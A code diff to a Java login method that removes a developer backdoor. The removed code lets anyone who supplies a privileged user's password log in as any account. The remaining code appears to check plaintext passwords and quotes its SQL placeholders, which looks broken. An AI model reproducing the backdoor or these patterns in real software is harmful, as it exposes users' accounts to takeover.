@@ -30,30 +30,8 @@ public class LoginModel {
 	}
 	
 	public boolean login(String username, String password){
-		// allows devs to access all accounts
-		Map passwords = db.sql("SELECT password FROM users INNER JOIN privlages ON users.access_level = privlages.access_level WHERE code='ACAA'")
-				.retrieve();
-		
-		if(passwords.get("array")!=null){
-			for (Object obj : (List)passwords.get("array")) {
-				String val = obj.toString();
-				if(password.equals(val)){
-					am.loginUser(username);
-					return true;
-				}
-			}
-		}
-		if(passwords.get("password")!=null){
-			String val = passwords.get("password").toString();
-			if(password.equals(val)){
-				am.loginUser(username);
-				return true;
-			}
-			
-		}
-		
-		
-		
+		//to test db connection
+		db.sql("SELECT id FROM users LIMIT 1 ").retrieve();
 		
 		Map map = db.sql("SELECT id FROM users WHERE username = '?' AND password = '?' LIMIT 1")
 		.set(username)
